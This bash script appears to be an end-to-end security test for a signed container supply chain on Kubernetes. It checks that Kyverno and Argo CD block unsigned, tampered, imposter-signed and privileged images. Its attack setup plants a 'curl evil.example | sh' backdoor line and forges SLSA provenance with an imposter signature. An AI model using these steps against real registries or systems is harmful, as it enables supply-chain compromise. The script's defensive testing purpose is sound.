#!/usr/bin/env bash
# End-to-end attack test. Runs in GitHub Actions (it needs a GitHub OIDC token for keyless signing
# and write access to GHCR and to a temporary branch). Every number in reports/e2e-results.md is measured.
#   DIGEST=sha256:... scripts/e2e.sh          (DIGEST = an image signed by release.yaml on main)
# shellcheck source=lib.sh
source "$(dirname "$0")/lib.sh"
cd "$ROOT" || exit 1

: "${DIGEST:?set DIGEST to a released image digest}"
: "${GITHUB_TOKEN:?needs GITHUB_TOKEN with packages:write and contents:write (run in GitHub Actions)}"
: "${GITHUB_REPOSITORY:=sufyanahmadkamboh/sufyan-devops-secure-supply-chain}"
export GHCR_USER="${GITHUB_ACTOR:-sufyanahmadkamboh}"
IMAGE=ghcr.io/sufyanahmadkamboh/storefront-api
TRUSTED="$IMAGE@$DIGEST"
RUN="${GITHUB_RUN_ID:-local$(date +%s)}"
BRANCH="e2e/run-$RUN"
echo "$BRANCH" > "$STATE/e2e-branch" 2>/dev/null || { mkdir -p "$STATE"; echo "$BRANCH" > "$STATE/e2e-branch"; }

RESULTS="$ROOT/reports/e2e-results.md"
mkdir -p "$ROOT/reports"
printf '# End-to-end results (%s)\n\nTrusted image: %s\n' "$(date -u '+%Y-%m-%d %H:%M UTC')" "\`$TRUSTED\`" > "$RESULTS"
record()  { echo "$*" >> "$RESULTS"; }
pass()    { ok "$*"; record "- PASS: $*"; }
fail()    { record "- FAIL: $*"; die "$*"; }
section() { log "$*"; record ""; record "## $*"; }

# ---- helpers ----------------------------------------------------------------------------------
git_push_branch() {  # message; prints the pushed commit
  local remote="https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
  git -c user.name=e2e -c user.email=e2e@users.noreply.github.com commit -qam "$1" || fail "git commit failed: $1"
  git push -q "$remote" "HEAD:refs/heads/$BRANCH" --force || fail "git push failed: $1"
  local head; head="$(git rev-parse HEAD)"
  [[ "$(git ls-remote "$remote" "refs/heads/$BRANCH" | cut -f1)" == "$head" ]] || fail "remote branch is not at $head"
  echo "$head"
}
argo_at_revision() { [[ "$(argo '{.status.sync.revision}')" == "$1" ]]; }
set_prod_digest() { sed -i -E "s|(    digest: )sha256:[a-f0-9]{64}|\1$1|" deploy/prod/kustomization.yaml; }

argo() { k -n argocd get application storefront-api -o jsonpath="$1"; }
argo_refresh() { k -n argocd annotate application storefront-api argocd.argoproj.io/refresh=hard --overwrite >/dev/null; }
prod_running_digest() { k -n prod get pods -l app.kubernetes.io/name=storefront-api -o jsonpath='{range .items[*]}{.status.containerStatuses[0].imageID}{"\n"}{end}' | sed 's/.*@//' | sort -u; }
prod_healthy_on() {  # digest: all ready pods run it and there are 2
  [[ "$(prod_running_digest)" == "$1" ]] \
    && [[ "$(k -n prod get deploy storefront-api -o jsonpath='{.status.readyReplicas}')" == 2 ]]
}

# Applies a Deployment in prod with the given image and pod-security settings; prints the
# admission result: "admitted" or the denial message. Times the request.
try_deploy() {  # name image [privileged]
  local name="$1" image="$2" priv="${3:-false}"
  local manifest
  manifest="$(cat <<EOF
apiVersion: v1
kind: Pod
metadata: {name: $name, namespace: prod, labels: {test: attack}}
spec:
  automountServiceAccountToken: false
  securityContext:
    seccompProfile: {type: RuntimeDefault}
  containers:
    - name: app
      image: $image
      securityContext:
        runAsNonRoot: true
        allowPrivilegeEscalation: $priv
        privileged: $priv
        readOnlyRootFilesystem: true
        capabilities: {drop: [ALL]}
      resources: {limits: {cpu: 100m, memory: 32Mi}}
EOF
)"
  local start out
  start=$(date +%s%N)
  if out="$(echo "$manifest" | tb kubectl apply -f - 2>&1)"; then
    echo "admitted|$(( ($(date +%s%N) - start) / 1000000 ))"
    k -n prod delete pod "$name" --now >/dev/null 2>&1 || true
  else
    local why
    why="$(echo "$out" | grep -oE 'denied the request: .*|violates PodSecurity .*' | head -n1 | cut -c1-200)"
    echo "denied: ${why:-$(echo "$out" | head -n1 | cut -c1-200)}|$(( ($(date +%s%N) - start) / 1000000 ))"
  fi
}
expect_denied() {  # label name image [privileged]
  local r; r="$(try_deploy "$2" "$3" "${4:-false}")"
  local verdict="${r%|*}" ms="${r##*|}"
  if [[ "$verdict" == denied:* ]]; then
    pass "$1 → BLOCKED in ${ms} ms (${verdict#denied: })"
  else
    fail "$1 → was admitted"
  fi
}

# ---- 1. platform ------------------------------------------------------------------------------
s1() {
  section "1. Platform"
  log "Temporary GitOps branch $BRANCH with the new digest"
  git checkout -q -B "$BRANCH"
  set_prod_digest "$DIGEST"
  git_push_branch "e2e: deploy $DIGEST" >/dev/null
  local start; start=$(date +%s)
  ARGO_REVISION="$BRANCH" scripts/platform-up.sh
  pass "kind + Kyverno + policies + Argo CD + Trivy Operator + Prometheus/Grafana up in $(( $(date +%s) - start )) s"
}

# ---- 2. the legitimate release ----------------------------------------------------------------
s2() {
  section "2. Legitimate release through GitOps"
  local start; start=$(date +%s)
  argo_refresh
  if wait_for 600 prod_healthy_on "$DIGEST" >/dev/null; then
    pass "Argo CD synced the signed release; 2/2 pods running the verified digest after $(( $(date +%s) - start )) s"
  else
    k -n prod get events --sort-by=.lastTimestamp | tail -n 15 >&2
    fail "the signed release did not become healthy"
  fi
  local img; img="$(k -n prod get pods -l app.kubernetes.io/name=storefront-api -o jsonpath='{.items[0].spec.containers[0].image}')"
  record "- pod image as admitted: \`$img\`"
  local v
  v="$(k -n sandbox run probe-$RANDOM --rm -i --restart=Never --quiet --image=curlimages/curl:8.16.0 -- \
        curl -s http://storefront-api.prod.svc/version 2>/dev/null || true)"
  if [[ "$v" == *version* ]]; then pass "service answers: $v"; else fail "service did not answer /version"; fi
}

# ---- 3. attacks at admission ------------------------------------------------------------------
s3() {
  section "3. Attacks at the cluster door (admission)"
  log "Preparing attacker images in the real repository (simulates a stolen registry token)"
  tb bash -c "
    set -e
    echo \"\$GITHUB_TOKEN\" | crane auth login ghcr.io -u \"\$GHCR_USER\" --password-stdin >/dev/null
    # unsigned: a completely different image pushed into our repository
    crane copy docker.io/library/busybox:1.37 $IMAGE:e2e-unsigned-$RUN >/dev/null 2>&1
    # tampered: the trusted image plus one extra layer (a 'backdoor' file), same name
    mkdir -p /tmp/bd && echo 'curl evil.example | sh' > /tmp/bd/backdoor.sh && tar -C /tmp/bd -cf /tmp/bd.tar backdoor.sh
    crane append -b $TRUSTED -f /tmp/bd.tar -t $IMAGE:e2e-tampered-$RUN >/dev/null 2>&1
  "
  UNSIGNED="$IMAGE@$(tb crane digest "$IMAGE:e2e-unsigned-$RUN")"
  TAMPERED="$IMAGE@$(tb crane digest "$IMAGE:e2e-tampered-$RUN")"
  echo "$TAMPERED" > "$STATE/tampered"

  expect_denied "foreign registry image (docker.io/library/nginx)" attack-foreign docker.io/library/nginx:1.29
  expect_denied "unsigned image pushed into the trusted repository" attack-unsigned "$UNSIGNED"
  expect_denied "tampered copy of the trusted image (extra layer, not signed)" attack-tampered "$TAMPERED"

  log "Imposter: sign + attest the tampered image from a DIFFERENT workflow (e2e.yaml), with fake provenance"
  scripts/ci/provenance.sh "$TAMPERED" | jq '.runDetails.builder.id |= sub("e2e.yaml";"release.yaml")
    | .buildDefinition.externalParameters.workflow.path = ".github/workflows/release.yaml"' > "$STATE/fake-provenance.json"
  echo '{"scanner":{"result":{"Results":[]}}}' > "$STATE/fake-vuln.json"
  # The signatures must really exist, otherwise "blocked" below would prove nothing.
  echo "$GITHUB_TOKEN" | cosign login ghcr.io -u "$GHCR_USER" --password-stdin >/dev/null 2>&1 || fail "cosign login to GHCR failed"
  local legacy=(--new-bundle-format=false --use-signing-config=false --yes)
  cosign sign "${legacy[@]}" "$TAMPERED" > "$STATE/imposter-sign.log" 2>&1 || { cat "$STATE/imposter-sign.log"; fail "imposter signing failed"; }
  cosign attest "${legacy[@]}" --type slsaprovenance1 --predicate "$STATE/fake-provenance.json" "$TAMPERED" >> "$STATE/imposter-sign.log" 2>&1 \
    || { cat "$STATE/imposter-sign.log"; fail "imposter attestation failed"; }
  cosign attest "${legacy[@]}" --type vuln --predicate "$STATE/fake-vuln.json" "$TAMPERED" >> "$STATE/imposter-sign.log" 2>&1 \
    || { cat "$STATE/imposter-sign.log"; fail "imposter attestation failed"; }
  local subject
  subject="$(cosign verify --certificate-identity-regexp '.*' --certificate-oidc-issuer https://token.actions.githubusercontent.com "$TAMPERED" 2>/dev/null \
    | jq -r '.[0].optional.Subject')"
  if [[ "$subject" == *"/.github/workflows/e2e.yaml@"* ]]; then
    pass "imposter image carries a VALID Sigstore signature, identity: $subject"
  else
    fail "imposter signature not verifiable (subject: '$subject')"
  fi

  expect_denied "tampered image signed by an imposter workflow with forged provenance" attack-imposter "$TAMPERED"
  expect_denied "trusted image started as a privileged container" attack-privileged "$TRUSTED" true

  local r; r="$(try_deploy control-trusted "$TRUSTED")"
  if [[ "${r%|*}" == admitted ]]; then pass "control: the trusted image with a safe pod spec is admitted (${r##*|} ms)"; else fail "control: trusted image denied: ${r%|*}"; fi
}

# ---- 4. attack through GitOps -----------------------------------------------------------------
s4() {
  section "4. Attack through GitOps (a malicious commit to the deploy manifests)"
  local tampered; tampered="$(cat "$STATE/tampered")"
  set_prod_digest "${tampered##*@}"
  local bad; bad="$(git_push_branch "e2e: malicious digest change")"
  record "- malicious commit \`${bad:0:12}\` sets deploy/prod to the imposter-signed digest"
  local start; start=$(date +%s)
  argo_refresh
  wait_for 300 argo_at_revision "$bad" >/dev/null || fail "Argo CD never picked up commit $bad (at: $(argo '{.status.sync.revision}'))"
  record "- Argo CD applied the malicious commit after $(( $(date +%s) - start )) s"
  # Kyverno can refuse at two points: the Deployment update itself (its image policy also covers pod
  # controllers) or, later, the ReplicaSet's pod creation. Either way nothing untrusted may start.
  deploy_refusal() { argo '{.status.operationState.syncResult.resources[?(@.kind=="Deployment")].message}'; }
  pod_refusal() { k -n prod get events --field-selector reason=FailedCreate -o jsonpath='{.items[*].message}'; }
  blocked() { { deploy_refusal; pod_refusal; } | grep -q "verify-release-images"; }
  if wait_for 300 blocked >/dev/null; then
    local where="pod creation"
    deploy_refusal | grep -q verify-release-images && where="the Deployment update (Argo CD sync: $(argo '{.status.operationState.phase}'))"
    pass "Kyverno refused the malicious rollout at $where, $(( $(date +%s) - start )) s after the push"
    record "- refusal: $( { deploy_refusal; pod_refusal; } | grep -o 'Policy verify-release-images failed: [^.;]*' | head -n1)"
  else
    record "- Argo CD: $(argo '{.status.operationState.message}')"
    fail "the malicious rollout was not blocked"
  fi
  sleep 20
  if [[ "$(prod_running_digest)" == "$DIGEST" ]]; then
    pass "production still runs only the trusted digest (old pods kept serving: maxUnavailable=0)"
  else
    fail "an untrusted digest is running in production"
  fi
  local v
  v="$(k -n sandbox run probe-$RANDOM --rm -i --restart=Never --quiet --image=curlimages/curl:8.16.0 -- curl -s http://storefront-api.prod.svc/healthz 2>/dev/null || true)"
  if [[ "$v" == *ok* ]]; then pass "service stayed available during the attack"; else fail "service unavailable during the attack"; fi
  record "- Argo CD status during the attack: sync=$(argo '{.status.sync.status}'), health=$(argo '{.status.health.status}')"

  log "Revert the malicious commit"
  set_prod_digest "$DIGEST"
  local good; good="$(git_push_branch "e2e: revert")"
  start=$(date +%s)
  argo_refresh
  wait_for 300 argo_at_revision "$good" >/dev/null || fail "Argo CD never picked up the revert" 
  synced() { [[ "$(argo '{.status.sync.status}')" == Synced ]] && prod_healthy_on "$DIGEST"; }
  if wait_for 300 synced >/dev/null; then pass "after the revert Argo CD is Synced again in $(( $(date +%s) - start )) s"; else fail "not Synced after revert"; fi
}

# ---- 5. sandbox: audit mode and continuous scanning --------------------------------------------
s5() {
  section "5. Sandbox: audit mode and continuous vulnerability scanning"
  local unsigned
  unsigned="$IMAGE@$(tb crane digest "$IMAGE:e2e-unsigned-$RUN")"
  if tb kubectl -n sandbox run unsigned --image="$unsigned" --restart=Never --command -- sleep 3600 >/dev/null 2>&1; then
    pass "audit mode: the unsigned image is allowed to run in sandbox (nothing blocked)"
  else
    fail "audit mode blocked a pod"
  fi
  # An old image with publicly known CRITICAL vulnerabilities, to exercise the re-scanning path.
  tb kubectl -n sandbox run legacy-nginx --image=docker.io/library/nginx:1.21.0 --restart=Never >/dev/null
  reported() { [[ "$(k -n sandbox get policyreports -o json | tb jq '[.items[].results[]? | select(.result=="fail")] | length')" -gt 0 ]]; }
  local start; start=$(date +%s)
  if wait_for 300 reported >/dev/null; then
    pass "PolicyReports list the violations $(( $(date +%s) - start )) s later: $(k -n sandbox get policyreports -o json | tb jq -r '[.items[].results[]? | select(.result=="fail") | .policy] | unique | join(", ")')"
  else
    fail "no PolicyReport violations in sandbox"
  fi

  start=$(date +%s)
  scanned() { [[ -n "$(k -n sandbox get vulnerabilityreports -o name 2>/dev/null)" ]]; }
  wait_for 900 scanned >/dev/null || fail "Trivy Operator produced no VulnerabilityReport"
  local crit
  crit="$(k -n sandbox get vulnerabilityreports -o json | tb jq '[.items[] | select(.report.artifact.repository | test("nginx")) | .report.summary.criticalCount] | add // 0')"
  pass "Trivy Operator scanned the running nginx:1.21.0 after $(( $(date +%s) - start )) s: $crit CRITICAL vulnerabilities"
  start=$(date +%s)
  firing() { k -n monitoring exec deploy/prometheus -- wget -qO- 'http://localhost:9090/api/v1/alerts' | grep -q '"alertname":"RunningImageHasCriticalVulnerabilities","[^}]*"state":"firing"\|"state":"firing"[^}]*RunningImageHasCriticalVulnerabilities'; }
  if wait_for 600 firing >/dev/null; then
    pass "alert RunningImageHasCriticalVulnerabilities firing $(( $(date +%s) - start )) s after the report"
  else
    fail "RunningImageHasCriticalVulnerabilities did not fire"
  fi
}

# ---- 6. monitoring ----------------------------------------------------------------------------
s6() {
  section "6. Monitoring"
  local alerts
  alerts="$(k -n monitoring exec deploy/prometheus -- wget -qO- 'http://localhost:9090/api/v1/alerts' | tb jq -r '[.data.alerts[] | select(.state=="firing") | .labels.alertname] | unique | join(", ")')"
  if [[ "$alerts" == *UntrustedWorkloadBlocked* ]]; then pass "alert UntrustedWorkloadBlocked is firing after the attacks"; else fail "UntrustedWorkloadBlocked not firing (firing: $alerts)"; fi
  record "- firing alerts: $alerts"
  if [[ "$alerts" != *AdmissionControllerDown* ]]; then pass "admission controller healthy"; else fail "AdmissionControllerDown firing"; fi
}

# (if/then, not `cond && sN`: bash ignores `set -e` inside anything run from an && list)
for n in 1 2 3 4 5 6; do
  if (( n >= ${E2E_FROM:-1} )); then "s$n"; fi
done
ok "All end-to-end checks passed. Results: reports/e2e-results.md"
